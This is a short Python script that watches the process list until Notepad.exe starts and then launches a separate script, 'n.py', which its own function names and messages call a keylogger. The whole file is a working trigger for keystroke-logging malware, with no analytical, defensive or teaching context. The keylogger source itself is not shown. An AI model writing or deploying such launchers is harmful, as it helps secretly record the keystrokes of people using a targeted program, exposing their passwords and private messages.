import psutil
import subprocess
import time

def is_process_running(process_name):
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] == process_name:
            return True
    return False

def run_keylogger():
    subprocess.Popen(['python', 'n.py'])

# Replace 'target.exe' with the name of your target executable
target_executable = 'Notepad.exe'

while True:
    if is_process_running(target_executable):
        print(f'{target_executable} is running. Starting keylogger...')
        run_keylogger()
        break
    time.sleep(1)
